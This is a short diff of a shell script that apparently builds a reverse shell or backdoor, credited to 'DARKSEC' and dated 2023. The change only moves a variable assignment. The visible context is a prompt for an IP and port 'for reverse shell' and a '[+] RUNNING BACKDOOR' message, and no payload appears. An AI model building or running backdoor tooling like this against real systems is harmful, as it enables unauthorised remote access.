@@ -3,11 +3,12 @@
 # on the ip and port, choice the type from payload or connection reverse.
 # CREATE IN 2023 BY DARKSEC
 
+darksec="$PWD"
+
 if [ -z $2 ];
 then
           echo -n 'PUT YOUR IP LOCAL AND YOUR PORT FOR REVERSE SHELL'
 else
-darksec="$PWD"
 
 echo '[+] RUNNING BACKDOOR'
 sleep 1
